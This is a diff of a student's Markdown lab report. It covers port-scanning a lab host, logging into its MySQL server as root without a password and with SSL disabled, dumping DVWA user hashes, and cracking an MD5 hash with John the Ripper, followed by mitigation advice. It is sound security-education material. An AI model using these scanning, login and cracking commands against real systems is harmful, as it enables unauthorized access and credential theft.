@@ -1,192 +1,158 @@
 # Lab 2: Cracking Weak Password Hashes & Exploiting Poor Authentication
 
-*Time Allocated: 3 Hours
+*Time Allocated: 3 Hours  
 Total Marks: 15* 
 
 ## OBJECTIVES
 1. Find and exploit weak crypto in database login and password storage.
-
 2. Do offline cracking of password hashes found in the database.
-
 3. Learn from real-world crypto mistakes and suggest better ways.
-
 4. Write a report in GitHub (Markdown) and show a short demo.
 
+---
+
 ## LAB TASK
-### 1. Service enumeration and initial access
 
-### **run scan to see open port for my sql**
+### 1. Service Enumeration and Initial Access
 
-run n map scan to look for mysql port . Use:
-
+To begin, we perform an Nmap scan to identify open ports on the target system:
 
 ```bash
 nmap -sS -sV -p- 192.168.100.131
 ```
-*we can see that our target's my sql port is available which is port 3306.*
 
+> This scan reveals that **MySQL is running on port 3306**, indicating that the server is potentially accessible.
 
-![alt text](Screenshot/nmap-scan.png.png)
+![nmap scan result](Screenshot/nmap-scan.png)
 
+We attempt to connect to the MySQL server using:
 
-I try to connect to the database using:
-
-
- ```
- my sql -h 192.168.100.131
- ```
-
-
-but it shows error ><
-
-
-![alt text](Screenshot/mysql_error.png)
-
-
-### **WHY DOES THIS HAPPEN?**
-
-This is because  MySQL Server  enforcing SSL/TLS, but the client and server disagree on the encryption protocol version.
-
-### **HOW TO FIX IT?**
-
-we need to disabled SSL so we can make a connection. Use:
-
-
+```bash
+mysql -h 192.168.100.131
 ```
+
+This results in a connection error:
+
+![mysql error](Screenshot/mysql_error.png)
+
+**Why does this happen?**  
+The error occurs because the **MySQL server enforces SSL/TLS**, but the default client does not support or negotiate the required encryption protocol.
+
+**How to fix it?**  
+We bypass the SSL requirement using the following command:
+
+```bash
 mysql -h 192.168.100.131 -u root --ssl=off
 ```
 
+> ⚠️ By disabling SSL, the connection is successful but **not encrypted**, meaning credentials are exposed during transmission.
 
-*by doing this we have disable SSL and bypasses the error but our credentials are not secured as it is not encrypted*
+![successful mysql connection](Screenshot/mysql-success.png)
 
+---
 
-![alt text](Screenshot/mysql-success.png)
+### 2. User Enumeration and Weak Authentication
 
-
-### 2. USER ENUMERATION AND WEAK AUTHENTICATION
-
-next step is to get the information about the database using:
-
+After successfully accessing the MySQL server, we begin database enumeration:
 
 ```bash
 show databases;
 ```
 
+![show databases](Screenshot/show-databases.png)
 
-![alt text](Screenshot/show-databases.png)
+We switch to the vulnerable `dvwa` database:
 
-
-
-*here we can see the dvwa which are vulnerable*
-
-so we will be needing to look trough dvwa table using:
-
-
-```bash 
+```bash
 use dvwa;
 ```
 
+![use dvwa](Screenshot/use-dvwa.png)
 
-![alt text](Screenshot/use-dvwa.png)
-
-
-we will need to list the table so use:
-
+List tables in the selected database:
 
 ```bash
 show tables;
 ```
 
+![show tables](Screenshot/show-tables.png)
 
-![alt text](Screenshot/show-tables.png)
-
-
-
-*as we found user's database now we can use it*
-
-
-try too look for passwords in users database using:
-
+Inspect the `users` table to find usernames and password hashes:
 
 ```bash
 select * from users;
 ```
 
+![user table](Screenshot/users-database.png)
 
-![alt text](Screenshot/users-database.png)
+From the output, we identify a **hashed password for the `admin` user**:
 
-
-
-*From this output we can crack the password that we choose.In this case i choose admin's passwords which is:*
-
-
-```bash
+```text
 5f4dcc3b5aa765d61d8327deb882cf99
 ```
 
-Now lets try to figure out what kind of hash is that.
+---
 
+### 3. Hash Type Identification
 
-### 3. PASSWORD HASH DISCOVERY AND HASH IDENTIFICATION
+We identify the hash type using the tool `hash-identifier`:
 
-
-we will be using hash-identifier tool. To open it using kali type :
-
-
-```bash 
+```bash
 hash-identifier
 ```
 
+Enter the hash and observe the result:
 
-![alt text](Screenshot/hash-id.png)
+![hash identification](Screenshot/hash-id.png)  
+![identified result](Screenshot/identifier-result.png)
 
+> The tool identifies it as **MD5**, a widely used but insecure hashing algorithm.
 
+---
 
-enter the hash and we will get the result !!
+### 4. Cracking the Password
 
-
-
-![alt text](Screenshot/identifier-result.png)
-
-
-
-4. CRACK THE PASSWORD
-
-
-
-create file hash.txt and paste the hash in it. Use :
-
-
-```
-echo "5f4dcc3b5aa765d61d8327deb882cf99">hash.txt  
-```
-
-
-![alt text](Screenshot/hash-txt.png)
-
-
-
-Then we will need to crack it using john the reaper. Use:
-
-
-```
-john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
-
-```
-
-
-![alt text](Screenshot/pass-crack.png)
-
-
-fnally now we can show the password using:
-
+We create a file to store the hash:
 
 ```bash
-cat ~/.john/john.pot 
+echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
 ```
 
+![hash file](Screenshot/hash-txt.png)
 
-![alt text](Screenshot/john-pot.png)
+Use **John the Ripper** to crack it with the popular RockYou wordlist:
 
+```bash
+john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
 
+![password cracked](Screenshot/pass-crack.png)
 
+Finally, view the cracked password:
+
+```bash
+cat ~/.john/john.pot
+```
+
+![john pot output](Screenshot/john-pot.png)
+
+> ✅ The password for the `admin` user is revealed to be: **password**
+
+---
+
+### 5. Cryptographic Analysis and Mitigation
+
+- **Weakness 1: MD5 Hashes** — MD5 is outdated and fast to compute, making it vulnerable to brute-force and rainbow table attacks.
+- **Weakness 2: Unencrypted Connection** — Disabling SSL for MySQL connections exposes login credentials to sniffing attacks.
+- **Weakness 3: Weak Password** — Simple passwords like `password` are trivial to crack and should never be used.
+
+**Recommendations:**
+- Use stronger hashing algorithms like **bcrypt**, **scrypt**, or **Argon2**.
+- Always enforce **TLS/SSL** for database connections.
+- Enforce **strong password policies** and implement **multi-factor authentication**.
+
+---
+
+## Conclusion
+
+This lab demonstrated how **weak password hashes, poor authentication, and lack of encryption** can be exploited by attackers. By identifying and cracking a weak MD5 hash and bypassing SSL requirements, we successfully extracted sensitive credentials. This highlights the importance of adopting **modern cryptographic standards** and **secure coding practices** to protect systems from real-world threats.
